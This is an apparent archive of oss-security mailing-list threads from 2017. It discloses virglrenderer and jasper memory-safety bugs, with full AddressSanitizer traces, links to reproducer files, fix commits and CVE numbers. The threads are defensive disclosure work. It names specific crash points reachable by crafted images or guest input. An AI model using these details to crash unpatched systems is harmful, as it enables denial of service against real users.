oR5zkwYOvozAdG2kgogpTzrQC2b5L6Q4OcwZ1jnOlvxH4QtUqLA7CoS3je3FTUjv
e+javkUWx0lFSwmSzUAgv4s9ynkRQndq8bPN7WzusaWgahR16VHuExP712+nY1QA
ztItLtLUgK7Ut9nnet3h
=z5+R
-----END PGP SIGNATURE-----


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144004.28364_9.NdNdNx,U=7757:2,ST -->

##### Matthias Gerstner <mgerstner@suse.de>, `20170224124833.GD3592@f195.suse.de`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
> A possible follow-up patch is attached.

Sorry, forgot the attachment. You can find the patch here:

https://bugzilla.suse.com/attachment.cgi?id=715395

-- 
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290

SUSE Linux GmbH 
GF: Felix Imendörffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)
On Fri, Feb 24, 2017 at 11:03:42AM +0100, Matthias Gerstner wrote:

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJYsCuhAAoJEBTEBclxkjVTFykQAMXP29mh6Lotz0/Zwca3crA2
A2X+jzXCgvtH8ZQwGelamMuu8Ae9Jwm7mLgdi8Atipytq0L6azlfQYgv/LkTG/1e
Ldq3LKsm5Mw6NJ/v+s27Se6SGbamDwzSQpLVd/ADdXNkeJyKxRXKIJ65HHPxIYvl
or8Flxa0cc/GDusqW53Y+kYSaduI1nQJNV1YnDRHgwQ/DZwOPfITklspzacs812Y
gdVSC0Zlacr41RGrKuweuc2/NND9rcF6X592MVZ2oaEFqvFCYVJSucRB6MAWLbFH
BN3gSGDpl2Dh7vbAUSNsJ/At4WLInglZOvBp+x5jPJ2NdkV3Rm3NgA6lJfiyM18Q
a1cNCPrKXPjSGmxAhmuMknqVGscBE8lVRMe/j3PwPRW1QDFaQ+kP7gjyOmyjJXdS
nUJElFhefjHFPEPVb3x3YW1o8Nw81ah+I5bWxqSb6By4BWDoc3QH78RlCPpHw2Vw
/fpFboXPcJz6qFF2MFl7shmsiMYU04RGekl6kSrJFEYTBn/08wAKUNS/LIYyt1E7
As21Plaf1MH/+dCIFpbYEDkyVI0/BJGDMmFm3eR3ZuixHjBUqsvYA5oSal4bMnsj
kLG34c/vZidkGZDQMBZtPW8VpBkJPi01VsMlGr4ytKYAMJ+qh76BO7dogsJTwM1w
ua1VJzjEzws/HioWbyfu
=xjWn
-----END PGP SIGNATURE-----


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] CVE-2017-6210 Virglrenderer: null pointer dereference in vrend_decode_reset</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905394.10177_34.NdNdNx,U=7717:2,T -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1702240015030.19005@wniryva`

```
   Hello,

Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
for the virtio GPU, is vulnerable to a null pointer dereference flaw. It could 
occur when destroying renderer context zero(0) in 'vrend_decode_reset'.

A guest user/process could use this flaw to crash the Qemu process instance 
resulting DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=0a5dff15912207b83018485f83e067474e818bab

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1426170

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6210' assigned via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details>
<summary><strong>[oss-security] CVE-2017-6209 Virglrenderer: stack buffer oveflow in parse_identifier</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905394.10177_32.NdNdNx,U=7715:2,T -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1702240012110.19005@wniryva`

```
    Hello,

Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
for the virtio GPU, is vulnerable to an OOB array access issue. It could occur 
when parsing properties in parse_identifier().

A guest user/process could use this flaw to crash the Qemu process instance 
resulting DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=e534b51ca3c3cd25f3990589932a9ed711c59b27

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1426149

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6209' assigned via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>

## jasper
<details>
<summary><strong>[oss-security] jasper: heap-based buffer overflow in jpc_dec_decodepkt (jpc_t2dec.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1485351298.11481_27.NdNdNx,U=5345:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `2979113.NTRsFXjtRy@blackgate`

```
Description:
jasper is an open-source initiative to provide a free software-based reference 
implementation of the codec specified in the JPEG-2000 Part-1 standard.

Another round of fuzzing shows that a crafted image causes a read overflow.

The complete ASan output:

# imginfo -f $FILE
warning: ignoring unknown marker segment (0xff70)
type = 0xff70 (UNKNOWN); len = 35;00 01 43 72 65 61 74 6f 74 3a 30 4a 61 73 50 
65 72 00 01 00 00 73 69 6f 6e 20 31 2e 39 30 30 2e 39 warning: trailing 
garbage in marker segment (3 bytes)
warning: trailing garbage in marker segment (8 bytes)
warning: trailing garbage in marker segment (6 bytes)
=================================================================
==30315==ERROR: AddressSanitizer: heap-buffer-overflow on address 
0x61a00001f808 at pc 0x7fb7b2667e54 bp 0x7ffd0a9ab890 sp 0x7ffd0a9ab888
READ of size 8 at 0x61a00001f808 thread T0
    #0 0x7fb7b2667e53 in jpc_dec_decodepkt /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_t2dec.c:245:14
    #1 0x7fb7b2667e53 in jpc_dec_decodepkts /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_t2dec.c:454
    #2 0x7fb7b25ccd37 in jpc_dec_process_sod /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:628:6
    #3 0x7fb7b25d6853 in jpc_dec_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:425:10
    #4 0x7fb7b25d6853 in jpc_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:262
    #5 0x7fb7b25a6231 in jp2_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_dec.c:218:21
    #6 0x7fb7b2568214 in jas_image_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_image.c:444:16
    #7 0x50a3be in main /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/appl/imginfo.c:238:16
    #8 0x7fb7b164878f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-
r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #9 0x419cd8 in _start (/usr/bin/imginfo+0x419cd8)

0x61a00001f808 is located 48 bytes to the right of 1368-byte region 
[0x61a00001f280,0x61a00001f7d8)
allocated by thread T0 here:
    #0 0x4d2a98 in malloc /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/asan_malloc_linux.cc:64
    #1 0x7fb7b2575160 in jas_malloc /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_malloc.c:242:11
    #2 0x7fb7b2575160 in jas_alloc2 /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_malloc.c:275
    #3 0x7fb7b25ca2bf in jpc_dec_tileinit /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:841:24
    #4 0x7fb7b25ca2bf in jpc_dec_process_sod /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:594
    #5 0x7fb7b25d6853 in jpc_dec_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:425:10
    #6 0x7fb7b25d6853 in jpc_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:262
    #7 0x7fb7b25a6231 in jp2_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_dec.c:218:21
    #8 0x7fb7b2568214 in jas_image_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_image.c:444:16
    #9 0x50a3be in main /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/appl/imginfo.c:238:16
    #10 0x7fb7b164878f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-
r3/work/glibc-2.23/csu/../csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_t2dec.c:245:14 in 
jpc_dec_decodepkt
Shadow bytes around the buggy address:
  0x0c347fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbef0: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
=>0x0c347fffbf00: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==30315==ABORTING

Affected version:
2.0.10

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00126-jasper-heapoverflow-jpc_dec_decodepkt

Timeline:
2017-01-25: bug discovered and reported upstream
2017-01-25: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/01/25/jasper-heap-based-buffer-overflow-in-jpc_dec_decodepkt-jpc_t2dec-c

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1485351298.11481_30.NdNdNx,U=5348:2,T -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170125094117.GC30424@lorien.valinor.li`

```
On Wed, Jan 25, 2017 at 10:16:01AM +0100, Agostino Sarubbo wrote:
> Description:
> jasper is an open-source initiative to provide a free software-based reference 
> implementation of the codec specified in the JPEG-2000 Part-1 standard.
> 
> Another round of fuzzing shows that a crafted image causes a read overflow.
> 
> The complete ASan output:
> 
> # imginfo -f $FILE
> warning: ignoring unknown marker segment (0xff70)
> type = 0xff70 (UNKNOWN); len = 35;00 01 43 72 65 61 74 6f 74 3a 30 4a 61 73 50 
> 65 72 00 01 00 00 73 69 6f 6e 20 31 2e 39 30 30 2e 39 warning: trailing 
> garbage in marker segment (3 bytes)
> warning: trailing garbage in marker segment (8 bytes)
> warning: trailing garbage in marker segment (6 bytes)
> =================================================================
> ==30315==ERROR: AddressSanitizer: heap-buffer-overflow on address 
> 0x61a00001f808 at pc 0x7fb7b2667e54 bp 0x7ffd0a9ab890 sp 0x7ffd0a9ab888
> READ of size 8 at 0x61a00001f808 thread T0
>     #0 0x7fb7b2667e53 in jpc_dec_decodepkt /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_t2dec.c:245:14
>     #1 0x7fb7b2667e53 in jpc_dec_decodepkts /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_t2dec.c:454
>     #2 0x7fb7b25ccd37 in jpc_dec_process_sod /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:628:6
>     #3 0x7fb7b25d6853 in jpc_dec_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:425:10
>     #4 0x7fb7b25d6853 in jpc_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:262
>     #5 0x7fb7b25a6231 in jp2_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_dec.c:218:21
>     #6 0x7fb7b2568214 in jas_image_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_image.c:444:16
>     #7 0x50a3be in main /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/appl/imginfo.c:238:16
>     #8 0x7fb7b164878f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-
> r3/work/glibc-2.23/csu/../csu/libc-start.c:289
>     #9 0x419cd8 in _start (/usr/bin/imginfo+0x419cd8)
> 
> 0x61a00001f808 is located 48 bytes to the right of 1368-byte region 
> [0x61a00001f280,0x61a00001f7d8)
> allocated by thread T0 here:
>     #0 0x4d2a98 in malloc /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/asan_malloc_linux.cc:64
>     #1 0x7fb7b2575160 in jas_malloc /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_malloc.c:242:11
>     #2 0x7fb7b2575160 in jas_alloc2 /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_malloc.c:275
>     #3 0x7fb7b25ca2bf in jpc_dec_tileinit /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:841:24
>     #4 0x7fb7b25ca2bf in jpc_dec_process_sod /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:594
>     #5 0x7fb7b25d6853 in jpc_dec_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:425:10
>     #6 0x7fb7b25d6853 in jpc_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_dec.c:262
>     #7 0x7fb7b25a6231 in jp2_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_dec.c:218:21
>     #8 0x7fb7b2568214 in jas_image_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_image.c:444:16
>     #9 0x50a3be in main /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/appl/imginfo.c:238:16
>     #10 0x7fb7b164878f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-
> r3/work/glibc-2.23/csu/../csu/libc-start.c:289
> 
> SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jpc/jpc_t2dec.c:245:14 in 
> jpc_dec_decodepkt
> Shadow bytes around the buggy address:
>   0x0c347fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>   0x0c347fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>   0x0c347fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>   0x0c347fffbee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>   0x0c347fffbef0: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
> =>0x0c347fffbf00: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>   0x0c347fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>   0x0c347fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>   0x0c347fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>   0x0c347fffbf40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>   0x0c347fffbf50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
> Shadow byte legend (one shadow byte represents 8 application bytes):
>   Addressable:           00
>   Partially addressable: 01 02 03 04 05 06 07 
>   Heap left redzone:       fa
>   Heap right redzone:      fb
>   Freed heap region:       fd
>   Stack left redzone:      f1
>   Stack mid redzone:       f2
>   Stack right redzone:     f3
>   Stack partial redzone:   f4
>   Stack after return:      f5
>   Stack use after scope:   f8
>   Global redzone:          f9
>   Global init order:       f6
>   Poisoned by user:        f7
>   Container overflow:      fc
>   Array cookie:            ac
>   Intra object redzone:    bb
>   ASan internal:           fe
>   Left alloca redzone:     ca
>   Right alloca redzone:    cb
> ==30315==ABORTING
> 
> Affected version:
> 2.0.10
> 
> Fixed version:
> N/A
> 
> Commit fix:
> N/A
> 
> Credit:
> This bug was discovered by Agostino Sarubbo of Gentoo.
> 
> CVE:
> N/A
> 
> Reproducer:
> https://github.com/asarubbo/poc/blob/master/00126-jasper-heapoverflow-jpc_dec_decodepkt
> 
> Timeline:
> 2017-01-25: bug discovered and reported upstream
> 2017-01-25: blog post about the issue
> 
> Note:
> This bug was found with American Fuzzy Lop.
> 
> Permalink:
> https://blogs.gentoo.org/ago/2017/01/25/jasper-heap-based-buffer-overflow-in-jpc_dec_decodepkt-jpc_t2dec-c

This one should be https://github.com/mdadams/jasper/issues/114

Regards,
Salvatore

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489403773.12586_1.Morbo,U=41403:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `4259614.1heLH0LskT@blackgate`

```
On Wednesday 25 January 2017 10:16:01 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/01/25/jasper-heap-based-buffer-overflow-in
> -jpc_dec_decodepkt-jpc_t2dec-c

This is CVE-2017-6852

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] jasper: NULL pointer dereference in jp2_cdef_destroy (jp2_cod.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1485351298.11481_25.NdNdNx,U=5343:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `4852597.N8d9Bx2SxP@blackgate`

```
Description:
jasper is an open-source initiative to provide a free software-based reference 
implementation of the codec specified in the JPEG-2000 Part-1 standard.

Another round of fuzzing shows that a crafted image causes a NULL pointer 
access.

The complete ASan output:

# imginfo -f $FILE
cannot parse box data
ASAN:DEADLYSIGNAL
=================================================================
==6697==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 
0x00000041da35 bp 0xbebebebebebebeae sp 0x7fff60ad6480 T0)
    #0 0x41da34 in atomic_compare_exchange_strong /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81
    #1 0x41da34 in 
__asan::Allocator::AtomicallySetQuarantineFlagIfAllocated(__asan::AsanChunk*, 
void*, __sanitizer::BufferedStackTrace*) /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/asan_allocator.cc:468
    #2 0x41da34 in __asan::Allocator::Deallocate(void*, unsigned long, 
__sanitizer::BufferedStackTrace*, __asan::AllocType) /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/asan_allocator.cc:522
    #3 0x41da34 in __asan::asan_free(void*, __sanitizer::BufferedStackTrace*, 
__asan::AllocType) /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/asan_allocator.cc:725
    #4 0x4d271c in free /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/asan_malloc_linux.cc:50
    #5 0x7f86ef11c995 in jp2_cdef_destroy /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_cod.c:230:3
    #6 0x7f86ef11e18e in jp2_box_destroy /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_cod.c:212:3
    #7 0x7f86ef11e18e in jp2_box_get /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_cod.c:319
    #8 0x7f86ef1219f6 in jp2_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_dec.c:159:16
    #9 0x7f86ef0e4214 in jas_image_decode /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_image.c:444:16
    #10 0x50a3be in main /tmp/portage/media-
libs/jasper-2.0.10/work/jasper-2.0.10/src/appl/imginfo.c:238:16
    #11 0x7f86ee1c478f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-
r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #12 0x419cd8 in _start (/usr/bin/imginfo+0x419cd8)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/sys-
devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81 in 
atomic_compare_exchange_strong
==6697==ABORTING

Affected version:
2.0.10

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00124-jasper-nullptr-jp2_cdef_destroy

Timeline:
2017-01-18: bug discovered and reported upstream
2017-01-25: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/01/25/jasper-null-pointer-dereference-in-jp2_cdef_destroy-jp2_cod-c

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1485351298.11481_28.NdNdNx,U=5346:2,T -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170125093901.GA30424@lorien.valinor.li`

```
Hi Agostino

On Wed, Jan 25, 2017 at 10:10:35AM +0100, Agostino Sarubbo wrote:
> Description:
> jasper is an open-source initiative to provide a free software-based reference 
> implementation of the codec specified in the JPEG-2000 Part-1 standard.
> 
> Another round of fuzzing shows that a crafted image causes a NULL pointer 
> access.
> 
> The complete ASan output:
> 
> # imginfo -f $FILE
> cannot parse box data
> ASAN:DEADLYSIGNAL
> =================================================================
> ==6697==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 
> 0x00000041da35 bp 0xbebebebebebebeae sp 0x7fff60ad6480 T0)
>     #0 0x41da34 in atomic_compare_exchange_strong /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81
>     #1 0x41da34 in 
> __asan::Allocator::AtomicallySetQuarantineFlagIfAllocated(__asan::AsanChunk*, 
> void*, __sanitizer::BufferedStackTrace*) /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/asan_allocator.cc:468
>     #2 0x41da34 in __asan::Allocator::Deallocate(void*, unsigned long, 
> __sanitizer::BufferedStackTrace*, __asan::AllocType) /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/asan_allocator.cc:522
>     #3 0x41da34 in __asan::asan_free(void*, __sanitizer::BufferedStackTrace*, 
> __asan::AllocType) /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/asan_allocator.cc:725
>     #4 0x4d271c in free /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/asan_malloc_linux.cc:50
>     #5 0x7f86ef11c995 in jp2_cdef_destroy /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_cod.c:230:3
>     #6 0x7f86ef11e18e in jp2_box_destroy /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_cod.c:212:3
>     #7 0x7f86ef11e18e in jp2_box_get /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_cod.c:319
>     #8 0x7f86ef1219f6 in jp2_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/jp2/jp2_dec.c:159:16
>     #9 0x7f86ef0e4214 in jas_image_decode /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/libjasper/base/jas_image.c:444:16
>     #10 0x50a3be in main /tmp/portage/media-
> libs/jasper-2.0.10/work/jasper-2.0.10/src/appl/imginfo.c:238:16
>     #11 0x7f86ee1c478f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-
> r3/work/glibc-2.23/csu/../csu/libc-start.c:289
>     #12 0x419cd8 in _start (/usr/bin/imginfo+0x419cd8)
> 
> AddressSanitizer can not provide additional info.
> SUMMARY: AddressSanitizer: SEGV /tmp/portage/sys-
> devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-
> rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81 in 
> atomic_compare_exchange_strong
> ==6697==ABORTING
> 
> Affected version:
> 2.0.10
> 
> Fixed version:
> N/A
> 
> Commit fix:
> N/A
> 
> Credit:
> This bug was discovered by Agostino Sarubbo of Gentoo.
> 
> CVE:
> N/A
> 
> Reproducer:
> https://github.com/asarubbo/poc/blob/master/00124-jasper-nullptr-jp2_cdef_destroy
> 
> Timeline:
> 2017-01-18: bug discovered and reported upstream

This should be: https://github.com/mdadams/jasper/issues/112

Could you please reference as well the upstream issues, if they are
reported in an upstream issue tracker? That would help much in
tracking the issues.

Regards,
Salvatore

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488798317.22694_8.Morbo,U=39531:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1769785.C3oWb3WdBS@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Wednesday 25 January 2017 10:10:35 Agostino Sarubbo 
wrote:
> https://blogs.gentoo.org/ago/2017/01/25/jasper-null-pointer-dereference-in-j
> p2_cdef_destroy-jp2_cod-c

This is fixed in the following commit:
https://github.com/mdadams/jasper/commit/e96fc4fdd525fa
0ede28074a7e2b1caf94b58b0d

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489403293.11987_1.Morbo,U=41400:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `6058659.ly9LUa4Ua5@blackgate`

```
On Wednesday 25 January 2017 10:10:35 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/01/25/jasper-null-pointer-dereference-in-j
> p2_cdef_destroy-jp2_cod-c

This is CVE-2017-6850

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] jasper: use of uninitialized value in jpc_pi_nextcprl (jpc_t2cod.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Important/cur/1489401681.10063_4.Morbo,U=16665:2,S -->

##### Agostino Sarubbo <ago@gentoo.org>, `6451341.vFYbS6xerg@blackgate`

```
If suitable for a CVE please assign one. Thanks.

Description:
jasper is an open-source initiative to provide a free software-based reference 
implementation of the codec specified in the JPEG-2000 Part-1 standard.

I decided to try another round of fuzzing with the Memory Sanitizer enabled, 
and I discovered that there is an use-of-uninitialized-value in 
jpc_pi_nextcprl

The complete MSan output:

# imginfo -f $FILE
warning: trailing garbage in marker segment (14 bytes)                                                                                                                                                                                                                         
warning: trailing garbage in marker segment (14 bytes)                                                                                                                                                                                                                         
warning: ignoring unknown marker segment                                                                                                                                                                                                                                       
